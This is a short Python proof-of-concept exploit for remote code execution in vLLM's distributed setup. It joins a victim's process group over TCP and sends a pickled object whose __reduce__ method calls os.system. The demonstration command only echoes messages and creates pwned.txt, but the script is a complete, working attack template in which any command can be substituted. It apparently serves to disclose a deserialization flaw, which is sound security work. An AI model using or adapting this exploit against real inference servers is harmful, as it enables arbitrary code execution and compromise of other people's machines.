import os
from vllm.distributed import (ensure_model_parallel_initialized,
                              init_distributed_environment, get_world_group)
import vllm

class Payload:
    def __reduce__(self):
        return (os.system, ("echo '[Attacker] Started RCE' && touch pwned.txt && echo '[Attacker] Completed RCE'",))

def main():
    victim_ip = os.environ.get("VICTIM_IP", "127.0.0.1")
    victim_port = os.environ.get("VICTIM_PORT", "29000")

    init_distributed_environment(
        backend="gloo", 
        distributed_init_method=f"tcp://{victim_ip}:{victim_port}", 
        rank=1, 
        world_size=2
    )
    
    print("[Attacker] Enqueuing malicious payload ...")
    try:
        vllm.distributed.GroupCoordinator.send_object(get_world_group(), obj=Payload(), dst=0)
        print("[Attacker] Successfully enqueued payload.")
    except Exception:
        vllm.distributed.GroupCoordinator.send_object(get_world_group(), obj="Safe String", dst=1)
        print("[Attacker] Failed to enqueue payload.")

if __name__ == "__main__":
    main()
